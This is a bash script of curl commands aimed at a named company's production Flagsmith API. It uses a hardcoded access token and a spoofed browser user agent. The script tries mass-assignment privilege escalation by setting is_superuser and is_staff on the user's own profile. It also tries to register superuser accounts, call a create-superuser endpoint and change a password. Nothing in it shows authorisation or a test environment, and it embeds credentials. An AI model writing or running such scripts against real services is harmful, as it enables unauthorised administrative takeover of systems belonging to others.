#!/bin/bash
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
KEY="03175989940bbc4e44d3c17711babe8a58effa8f"

# Test 1: PATCH user profile to set is_superuser
echo "=== PATCH is_superuser ==="
curl -s -X PATCH "https://flagsmith.koinworks.com/api/v1/auth/users/me/" \
  -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
  -d '{"is_superuser":true}' --max-time 10
echo ""

# Test 2: PUT user profile 
echo "=== PUT is_superuser ==="
curl -s -X PUT "https://flagsmith.koinworks.com/api/v1/auth/users/me/" \
  -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
  -d '{"first_name":"V","last_name":"9","is_superuser":true,"is_staff":true}' --max-time 10
echo ""

# Test 3: Check if it worked
echo "=== CHECK ==="
curl -s "https://flagsmith.koinworks.com/api/v1/auth/users/me/" \
  -H "Authorization: Token $KEY" -H "User-Agent: $UA" -H "Accept: application/json" --max-time 10
echo ""

# Test 4: Register NEW account with is_superuser in body
echo "=== REGISTER SUPERUSER ==="
curl -s -X POST "https://flagsmith.koinworks.com/api/v1/auth/users/" \
  -H "Content-Type: application/json" -H "User-Agent: $UA" \
  -d '{"email":"kw-su-test@proton.me","password":"Xk9mPw3nRt7v!S","first_name":"S","last_name":"U","is_superuser":true,"is_staff":true}' --max-time 15
echo ""

# Test 5: If superuser, try create-superuser again
echo "=== CREATE SUPERUSER RETRY ==="
curl -s -X POST "https://flagsmith.koinworks.com/api/v1/auth/users/create-superuser/" \
  -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
  -d '{"email":"kw-super-final@proton.me","password":"SuperFinal2026!X","first_name":"SF","last_name":"Admin"}' --max-time 15
echo ""

# Test 6: Try Djoser set_password to escalate  
echo "=== SET PASSWORD ==="
curl -s -X POST "https://flagsmith.koinworks.com/api/v1/auth/users/set_password/" \
  -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
  -d '{"current_password":"Xk9mPw3nRt7v!9","new_password":"NewPass2026!X"}' --max-time 10
echo ""
